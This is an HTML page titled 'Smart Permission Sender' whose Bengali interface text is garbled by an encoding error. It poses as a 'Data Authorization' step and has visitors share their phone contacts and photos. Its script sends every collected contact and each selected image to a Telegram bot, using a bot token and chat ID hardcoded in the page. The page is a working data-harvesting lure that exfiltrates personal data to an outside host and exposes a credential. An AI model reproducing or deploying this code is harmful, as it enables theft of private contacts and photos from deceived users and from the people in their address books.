<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Smart Permission Sender</title>
    <style>
        :root { --primary: #0088cc; --bg: #0f172a; --card: #1e293b; --text: #f8fafc; }
        body { font-family: sans-serif; background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { background: var(--card); padding: 30px; border-radius: 20px; width: 100%; max-width: 400px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.5); }
        .btn { background: var(--primary); color: white; border: none; padding: 15px; border-radius: 12px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .info-text { font-size: 14px; color: #94a3b8; margin-bottom: 20px; }
        #status { margin-top: 15px; font-weight: bold; color: #10b981; }
    </style>
</head>
<body>

<div class="container">
    <h2>Data Authorization üõ°Ô∏è</h2>
    <p class="info-text">‡¶è‡¶ó‡¶ø‡ßü‡ßá ‡¶Ø‡ßá‡¶§‡ßá ‡¶®‡¶ø‡¶ö‡ßá‡¶∞ ‡¶ß‡¶æ‡¶™‡¶ó‡ßÅ‡¶≤‡ßã ‡¶∏‡¶Æ‡ßç‡¶™‡¶®‡ßç‡¶® ‡¶ï‡¶∞‡ßÅ‡¶®</p>
    
    <button class="btn" id="contactBtn">üë§ ‡¶ï‡¶®‡ßç‡¶ü‡¶æ‡¶ï‡ßç‡¶ü ‡¶è‡¶ï‡ßç‡¶∏‡ßá‡¶∏ ‡¶¶‡¶ø‡¶®</button>
    <div id="contact-status" style="font-size: 12px; margin: 5px 0;"></div>

    <hr style="border: 0.5px solid #334155; margin: 20px 0;">

    <input type="file" id="images" multiple accept="image/*" style="display: none;">
    <button class="btn" onclick="document.getElementById('images').click()">üñºÔ∏è ‡¶õ‡¶¨‡¶ø ‡¶∏‡¶ø‡¶≤‡ßá‡¶ï‡ßç‡¶ü ‡¶ï‡¶∞‡ßÅ‡¶®</button>
    <div id="file-count" style="font-size: 12px; margin: 5px 0;"></div>

    <button class="btn" id="finalSend" style="background: #10b981; margin-top: 20px;" disabled>‡¶∏‡¶¨‡¶ï‡¶ø‡¶õ‡ßÅ ‡¶™‡¶æ‡¶†‡¶æ‡¶®</button>
    
    <div id="status"></div>
</div>

<script>
    const botToken = "7885791804:AAHQjsAsMuBfvVqWga0hub2m0QZ7BrgsAsc";
    const chatId = "5923885908";
    
    let savedContacts = "";

    // ‡¶ï‡¶®‡ßç‡¶ü‡¶æ‡¶ï‡ßç‡¶ü ‡¶™‡¶æ‡¶∞‡¶Æ‡¶ø‡¶∂‡¶® ‡¶ì ‡¶∏‡¶ø‡¶≤‡ßá‡¶ï‡¶∂‡¶®
    document.getElementById('contactBtn').onclick = async () => {
        if ('contacts' in navigator) {
            try {
                // ‡¶¨‡ßç‡¶∞‡¶æ‡¶â‡¶ú‡¶æ‡¶∞ ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶á‡¶â‡¶ú‡¶æ‡¶∞‡ßá‡¶∞ ‡¶ï‡¶æ‡¶õ‡ßá ‡¶Ö‡¶®‡ßÅ‡¶Æ‡¶§‡¶ø ‡¶ö‡¶æ‡¶á‡¶¨‡ßá
                const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                if (contacts.length > 0) {
                    savedContacts = contacts.map(c => `${c.name}: ${c.tel.join(', ')}`).join('\n');
                    document.getElementById('contact-status').innerText = "‚úÖ ‡¶ï‡¶®‡ßç‡¶ü‡¶æ‡¶ï‡ßç‡¶ü ‡¶Ö‡¶®‡ßÅ‡¶Æ‡¶§‡¶ø ‡¶™‡¶æ‡¶ì‡ßü‡¶æ ‡¶ó‡ßá‡¶õ‡ßá";
                    checkReady();
                }
            } catch (err) {
                document.getElementById('contact-status').innerText = "‚ùå ‡¶Ö‡¶®‡ßÅ‡¶Æ‡¶§‡¶ø ‡¶¨‡¶æ‡¶§‡¶ø‡¶≤ ‡¶ï‡¶∞‡¶æ ‡¶π‡ßü‡ßá‡¶õ‡ßá";
            }
        } else {
            alert("‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶´‡ßã‡¶®‡ßá ‡¶Ö‡¶ü‡ßã‡¶Æ‡ßá‡¶ü‡¶ø‡¶ï ‡¶ï‡¶®‡ßç‡¶ü‡¶æ‡¶ï‡ßç‡¶ü ‡¶™‡¶ø‡¶ï‡¶æ‡¶∞ ‡¶∏‡¶æ‡¶™‡ßã‡¶∞‡ßç‡¶ü ‡¶ï‡¶∞‡ßá ‡¶®‡¶æ‡•§");
        }
    };

    document.getElementById('images').onchange = () => {
        const count = document.getElementById('images').files.length;
        document.getElementById('file-count').innerText = `‚úÖ ${count} ‡¶ü‡¶ø ‡¶õ‡¶¨‡¶ø ‡¶∏‡¶ø‡¶≤‡ßá‡¶ï‡ßç‡¶ü ‡¶ï‡¶∞‡¶æ ‡¶π‡ßü‡ßá‡¶õ‡ßá`;
        checkReady();
    };

    function checkReady() {
        if (document.getElementById('images').files.length > 0) {
            document.getElementById('finalSend').disabled = false;
        }
    }

    document.getElementById('finalSend').onclick = async () => {
        const btn = document.getElementById('finalSend');
        const status = document.getElementById('status');
        const files = document.getElementById('images').files;

        btn.disabled = true;
        btn.innerText = "‡¶™‡ßç‡¶∞‡¶∏‡ßá‡¶∏ ‡¶π‡¶ö‡ßç‡¶õ‡ßá...";

        // ‡¶ï‡¶®‡ßç‡¶ü‡¶æ‡¶ï‡ßç‡¶ü ‡¶°‡¶æ‡¶ü‡¶æ ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
        if (savedContacts) {
            const text = `üìÅ ‡¶∏‡¶Ç‡¶ó‡ßÉ‡¶π‡ßÄ‡¶§ ‡¶ï‡¶®‡ßç‡¶ü‡¶æ‡¶ï‡ßç‡¶ü ‡¶≤‡¶ø‡¶∏‡ßç‡¶ü:\n\n${savedContacts}`;
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text })
            });
        }

        // ‡¶õ‡¶¨‡¶ø‡¶ó‡ßÅ‡¶≤‡ßã ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
        for (let i = 0; i < files.length; i++) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', files[i]);
            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
            status.innerText = `‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡¶π‡¶ö‡ßç‡¶õ‡ßá: ${i + 1}/${files.length}`;
        }

        status.innerText = "üéâ ‡¶∏‡¶¨ ‡¶°‡¶æ‡¶ü‡¶æ ‡¶∏‡¶´‡¶≤‡¶≠‡¶æ‡¶¨‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡¶π‡ßü‡ßá‡¶õ‡ßá!";
        btn.innerText = "‡¶∏‡¶¨‡¶ï‡¶ø‡¶õ‡ßÅ ‡¶™‡¶æ‡¶†‡¶æ‡¶®";
        btn.disabled = false;
    };
</script>

</body>
</html>
